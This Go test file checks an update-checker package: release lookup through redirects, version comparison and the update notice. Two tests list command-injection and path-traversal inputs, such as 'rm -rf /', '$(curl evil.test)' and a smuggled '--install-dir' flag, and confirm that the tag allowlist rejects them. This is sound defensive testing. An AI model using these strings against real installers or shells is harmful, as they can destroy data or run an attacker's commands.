// SPDX-FileCopyrightText: Copyright (c) 2026, NVIDIA CORPORATION & AFFILIATES. All rights reserved.
// SPDX-License-Identifier: Apache-2.0

package updatecheck

import (
	"context"
	"errors"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"
)

// Verifies the tag and the release page URL both come out of the redirect,
// without the page itself ever being fetched.
func TestLatest(t *testing.T) {
	var gotMethod, gotPath string
	var pageRequests int
	server := redirectServer(t, "v1.4.0", func(r *http.Request) {
		gotMethod, gotPath = r.Method, r.URL.Path
		if strings.Contains(r.URL.Path, releaseTagSegment) {
			pageRequests++
		}
	})

	release, err := Checker{ReleasesURL: server.URL + "/releases"}.Latest(context.Background())
	if err != nil {
		t.Fatalf("Latest failed: %v", err)
	}

	if gotMethod != http.MethodHead {
		t.Fatalf("expected a HEAD request, got %s", gotMethod)
	}
	if gotPath != "/releases/latest" {
		t.Fatalf("unexpected path %q", gotPath)
	}
	if pageRequests != 0 {
		t.Fatalf("expected the redirect not to be followed, got %d page requests", pageRequests)
	}
	if release.Version != "v1.4.0" {
		t.Fatalf("unexpected version %q", release.Version)
	}
	if want := server.URL + "/releases/tag/v1.4.0"; release.URL != want {
		t.Fatalf("release URL = %q, want %q", release.URL, want)
	}
}

// Verifies a relative Location header resolves against the request URL.
func TestLatestRelativeRedirect(t *testing.T) {
	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
		w.Header().Set("Location", "/releases/tag/v1.4.0")
		w.WriteHeader(http.StatusFound)
	}))
	defer server.Close()

	release, err := Checker{ReleasesURL: server.URL + "/releases"}.Latest(context.Background())
	if err != nil {
		t.Fatalf("Latest failed: %v", err)
	}
	if release.Version != "v1.4.0" || release.URL != server.URL+"/releases/tag/v1.4.0" {
		t.Fatalf("unexpected release %#v", release)
	}
}

func TestLatestErrors(t *testing.T) {
	tests := []struct {
		name     string
		status   int
		location string
		wantErr  string
	}{
		// A repository with no release redirects to its release index, where the
		// REST API would have answered 404.
		{name: "no release", status: http.StatusFound, location: "/releases", wantErr: "no published release"},
		{name: "empty tag", status: http.StatusFound, location: "/releases/tag/", wantErr: "no published release"},
		{name: "no redirect", status: http.StatusOK, wantErr: "expected a redirect, got status 200"},
		{name: "not found", status: http.StatusNotFound, wantErr: "expected a redirect, got status 404"},
		{name: "no location", status: http.StatusFound, wantErr: "redirect has no Location"},
	}

	for _, test := range tests {
		t.Run(test.name, func(t *testing.T) {
			server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
				if test.location != "" {
					w.Header().Set("Location", test.location)
				}
				w.WriteHeader(test.status)
			}))
			defer server.Close()

			if _, err := (Checker{ReleasesURL: server.URL}).Latest(context.Background()); err == nil ||
				!strings.Contains(err.Error(), test.wantErr) {
				t.Fatalf("expected error containing %q, got %v", test.wantErr, err)
			}
		})
	}
}

// Verifies a named release resolves to its own page without following the
// latest-release permalink.
func TestRelease(t *testing.T) {
	var gotMethod, gotPath string
	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		gotMethod, gotPath = r.Method, r.URL.Path
		w.WriteHeader(http.StatusOK)
	}))
	defer server.Close()

	checker := Checker{ReleasesURL: server.URL + "/releases"}
	// The "v" is optional: a user reads the bare number off `version` output.
	for _, requested := range []string{"v1.1.0", "1.1.0", "V1.1.0"} {
		release, err := checker.Release(context.Background(), requested)
		if err != nil {
			t.Fatalf("Release(%q) failed: %v", requested, err)
		}
		if gotMethod != http.MethodHead {
			t.Fatalf("expected a HEAD request, got %s", gotMethod)
		}
		if gotPath != "/releases/tag/v1.1.0" {
			t.Fatalf("unexpected path %q for %q", gotPath, requested)
		}
		if release.Version != "v1.1.0" {
			t.Fatalf("Release(%q).Version = %q", requested, release.Version)
		}
		if want := server.URL + "/releases/tag/v1.1.0"; release.URL != want {
			t.Fatalf("release URL = %q, want %q", release.URL, want)
		}
	}
}

// Verifies an unpublished version is refused, and says so in a way the user can
// act on: this is the error behind `upgrade --version` on a typo.
func TestReleaseNotFound(t *testing.T) {
	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
		w.WriteHeader(http.StatusNotFound)
	}))
	defer server.Close()

	_, err := Checker{ReleasesURL: server.URL}.Release(context.Background(), "9.9.9")
	if !errors.Is(err, ErrReleaseNotFound) {
		t.Fatalf("expected ErrReleaseNotFound, got %v", err)
	}
	for _, want := range []string{"v9.9.9", releasesPage} {
		if !strings.Contains(err.Error(), want) {
			t.Fatalf("error missing %q: %v", want, err)
		}
	}
}

// Verifies a malformed version fails without a network call, and an unexpected
// status is not mistaken for a published release.
func TestReleaseErrors(t *testing.T) {
	requests := 0
	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
		requests++
		w.WriteHeader(http.StatusInternalServerError)
	}))
	defer server.Close()

	checker := Checker{ReleasesURL: server.URL}
	for _, requested := range []string{"", "  ", "latest", "1.x.0"} {
		if _, err := checker.Release(context.Background(), requested); err == nil {
			t.Fatalf("expected %q to be rejected", requested)
		}
	}
	if requests != 0 {
		t.Fatalf("expected a malformed version not to reach the network, got %d requests", requests)
	}

	_, err := checker.Release(context.Background(), "1.1.0")
	if err == nil || !strings.Contains(err.Error(), "unexpected status 500") {
		t.Fatalf("expected the status to surface, got %v", err)
	}
}

// Verifies a version that is not purely a version is refused before it can
// reach a URL or the installer's argument list.
//
// parseVersion is not a sufficient check on its own: it drops build metadata
// before parsing and does not constrain prerelease identifiers, so every input
// below parses as a valid semantic version. Only the tag allowlist stops them.
func TestReleaseTagRejectsHostileVersions(t *testing.T) {
	hostile := []string{
		"1.0.0-;rm -rf /",
		"1.0.0-$(curl evil.test)",
		"1.0.0-`id`",
		"1.0.0-\"; evil; \"",
		"1.0.0+../../../../etc/passwd",
		"1.0.0-../../foo",
		"1.0.0-a\nb",
		"1.0.0- --install-dir=/tmp/evil",
		"1.0.0-a b",
	}

	for _, version := range hostile {
		if _, err := parseVersion(version); err != nil {
			t.Fatalf("precondition: %q was expected to parse as a version, got %v", version, err)
		}
		tag, err := ReleaseTag(version)
		if err == nil {
			t.Fatalf("ReleaseTag(%q) returned %q, want a rejection", version, tag)
		}
	}

	// The tags releases actually carry must still be accepted.
	for _, version := range []string{"1.2.3", "v1.2.3", "V1.2.3", "1.2.3-rc.1", "1.2.3+build.7", "1.2"} {
		if _, err := ReleaseTag(version); err != nil {
			t.Fatalf("ReleaseTag(%q) failed: %v", version, err)
		}
	}
}

// Verifies a tag read off the wire is held to the same shape as one the user
// asked for: it too ends up as an argument to the installer.
func TestLatestRejectsHostileTag(t *testing.T) {
	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
		w.Header().Set("Location", "/releases/tag/v1.0.0-%24%28curl%20evil.test%29")
		w.WriteHeader(http.StatusFound)
	}))
	defer server.Close()

	_, err := Checker{ReleasesURL: server.URL}.Latest(context.Background())
	if err == nil || !strings.Contains(err.Error(), "is not a release tag") {
		t.Fatalf("expected a hostile tag to be refused, got %v", err)
	}
}

func TestIsSame(t *testing.T) {
	tests := []struct {
		a, b string
		want bool
	}{
		{a: "v1.2.0", b: "1.2.0", want: true},
		{a: "v1.2.0+build.7", b: "v1.2.0", want: true},
		{a: "v1.2", b: "v1.2.0", want: true},
		{a: "v1.2.0", b: "v1.2.1"},
		{a: "v1.2.0-rc.1", b: "v1.2.0"},
	}

	for _, test := range tests {
		got, err := IsSame(test.a, test.b)
		if err != nil {
			t.Fatalf("IsSame(%q, %q) failed: %v", test.a, test.b, err)
		}
		if got != test.want {
			t.Fatalf("IsSame(%q, %q) = %v, want %v", test.a, test.b, got, test.want)
		}
	}

	if _, err := IsSame("dev", "1.0.0"); err == nil {
		t.Fatal("expected an unparseable version to error")
	}
}

func TestCheck(t *testing.T) {
	server := redirectServer(t, "v1.4.0", nil)
	checker := Checker{ReleasesURL: server.URL}

	tests := []struct {
		name    string
		current string
		want    bool
	}{
		// goreleaser injects the bare number while the tag carries the "v".
		{name: "older", current: "1.3.9", want: true},
		{name: "older with prefix", current: "v1.3.9", want: true},
		{name: "current", current: "1.4.0"},
		{name: "prerelease of the same version", current: "1.4.0-rc.1", want: true},
		{name: "newer", current: "2.0.0"},
	}

	for _, test := range tests {
		t.Run(test.name, func(t *testing.T) {
			result, err := Check(context.Background(), checker, test.current)
			if err != nil {
				t.Fatalf("Check failed: %v", err)
			}
			if result.Available != test.want {
				t.Fatalf("Available = %v, want %v", result.Available, test.want)
			}
			if result.Version != "v1.4.0" {
				t.Fatalf("unexpected latest version %q", result.Version)
			}
		})
	}
}

// Serves the latest-release permalink the way github.com does: a redirect to
// the release's own page. observe, when set, sees every request the server gets,
// including a followed redirect the checker was supposed to stop at.
func redirectServer(t *testing.T, tag string, observe func(*http.Request)) *httptest.Server {
	t.Helper()

	var base string
	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if observe != nil {
			observe(r)
		}
		if strings.Contains(r.URL.Path, releaseTagSegment) {
			_, _ = w.Write([]byte("release page"))
			return
		}
		w.Header().Set("Location", base+releaseTagSegment+tag)
		w.WriteHeader(http.StatusFound)
	}))
	base = server.URL
	t.Cleanup(server.Close)
	return server
}

// Verifies a non-release build short-circuits before any network call.
func TestCheckSkipsDevBuild(t *testing.T) {
	requests := 0
	server := httptest.NewServer(http.HandlerFunc(func(_ http.ResponseWriter, _ *http.Request) {
		requests++
	}))
	defer server.Close()

	result, err := Check(context.Background(), Checker{ReleasesURL: server.URL}, "dev")
	if err != nil {
		t.Fatalf("Check failed: %v", err)
	}
	if result.Available || result.Version != "" {
		t.Fatalf("expected an empty result, got %#v", result)
	}
	if requests != 0 {
		t.Fatalf("expected no request for a dev build, got %d", requests)
	}
}

func TestIsNewer(t *testing.T) {
	tests := []struct {
		candidate string
		current   string
		want      bool
	}{
		{candidate: "v1.0.1", current: "v1.0.0", want: true},
		{candidate: "v1.1.0", current: "v1.0.9", want: true},
		{candidate: "v2.0.0", current: "v1.99.99", want: true},
		{candidate: "v1.0.0", current: "v1.0.0"},
		{candidate: "v1.0.0", current: "v1.0.1"},
		// Numeric prerelease identifiers compare numerically, not lexically, so
		// rc.10 outranks rc.9 rather than sorting before it.
		{candidate: "v1.0.0-rc.10", current: "v1.0.0-rc.9", want: true},
		{candidate: "v1.0.0-rc.9", current: "v1.0.0-rc.10"},
		{candidate: "v1.0.0", current: "v1.0.0-rc.8", want: true},
		{candidate: "v1.0.0-rc.8", current: "v1.0.0"},
		{candidate: "v1.0.0-beta", current: "v1.0.0-alpha", want: true},
		{candidate: "v1.0.0-rc.1.1", current: "v1.0.0-rc.1", want: true},
		// Build metadata is not part of precedence.
		{candidate: "v1.0.0+build.9", current: "1.0.0"},
		// Short forms fill missing components with zero.
		{candidate: "v1.1", current: "v1.0.9", want: true},
		{candidate: "v1", current: "v1.0.0"},
	}

	for _, test := range tests {
		t.Run(test.candidate+" vs "+test.current, func(t *testing.T) {
			got, err := IsNewer(test.candidate, test.current)
			if err != nil {
				t.Fatalf("IsNewer failed: %v", err)
			}
			if got != test.want {
				t.Fatalf("IsNewer(%q, %q) = %v, want %v", test.candidate, test.current, got, test.want)
			}
		})
	}
}

func TestIsReleaseVersion(t *testing.T) {
	valid := []string{"1.0.0", "v1.0.0", "v1.0.0-rc.1", "v1.0.0+build", "1.2", "1"}
	invalid := []string{"", "dev", "unknown", "v", "1.2.3.4", "1.x.0", "v1.0.0-", "v-1.0.0"}

	for _, value := range valid {
		if !IsReleaseVersion(value) {
			t.Fatalf("expected %q to parse as a release version", value)
		}
	}
	for _, value := range invalid {
		if IsReleaseVersion(value) {
			t.Fatalf("expected %q not to parse as a release version", value)
		}
	}
}

func TestNotice(t *testing.T) {
	result := Result{Release: Release{Version: "v1.4.0", URL: "https://example.test/v1.4.0"}, Available: true}

	notice := Notice(result, "1.0.0")
	for _, want := range []string{"Update available: v1.4.0 (current v1.0.0)", "https://example.test/v1.4.0", "Upgrade: "} {
		if !strings.Contains(notice, want) {
			t.Fatalf("notice missing %q: %q", want, notice)
		}
	}

	result.Available = false
	if notice := Notice(result, "1.4.0"); notice != "" {
		t.Fatalf("expected no notice when up to date, got %q", notice)
	}
}
